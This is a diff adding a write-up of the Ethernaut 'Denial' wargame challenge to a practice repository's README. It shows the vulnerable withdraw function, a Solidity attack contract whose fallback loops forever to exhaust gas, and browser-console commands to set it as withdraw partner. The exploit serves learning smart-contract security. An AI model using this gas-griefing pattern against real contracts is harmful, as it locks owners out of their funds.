@@ -654,6 +654,48 @@ Now, let's solve this:
 
 ***Note: `code.length--` only works with solidity versions prior to 0.6.0, for versions after that you need to use `code.pop()`. Also, from 0.8.0 solidity implemented underflow/overflow checks right in the compiler.***
 
+## 20 - Denial
+
+For reference -> [Challenge](./questions/20.Denial.sol) | [Solution](./answers/20.Denial.sol)
+
+This challenge needs us to not let owner withdraw the funds by being it's partner. Let's take a look on the vulnerability function:
+
+```solidity
+    function withdraw() public {
+        uint amountToSend = address(this).balance / 100;
+        partner.call{value: amountToSend}("");
+        payable(owner).transfer(amountToSend);
+        timeLastWithdrawn = block.timestamp;
+        withdrawPartnerBalances[partner] += amountToSend;
+    }
+```
+
+Here, one can notice that the line `partner.call{value: amountToSend}("");` is do transfering some value but not checking whether the call was successful or not. Thus, we can take an advantage of this by emptying up the gas within that function itself which won't let the owner withdraw any funds.
+Now, we will be creating a Attack contract which will be containing a `fallback` function that will do the task of receiving the ether when sent to it. Somehow, we will create some logic within the `fallback` function which will use up all the gas. Here's that function and the logic which is easily understandable if you know about infinite loops:
+
+```solidity
+    contract Attack {
+        fallback() external payable {
+            // Infinite loop to use up all the gas
+            while (true) {
+
+            }
+        }
+    }
+```
+
+Now, all we have to do is deploy this contract or you can take the one present in the [Solution](./answers/20.Denial.sol) file and copy its address.
+
+Then call these commands in your browser's console:
+
+```javascript
+    const copied_address = "your_attack_contract_address"
+    await contract.setWithdrawPartner(copied_address)
+
+    // Now, call the withdraw function
+    await contract.withdraw()
+```
+
 ## Contributing
 
 Contributions to the Ethernaut_Practice project are welcome! If you have a solution to a challenge that is not yet included, or if you have suggestions for improvements, feel free to open a pull request.
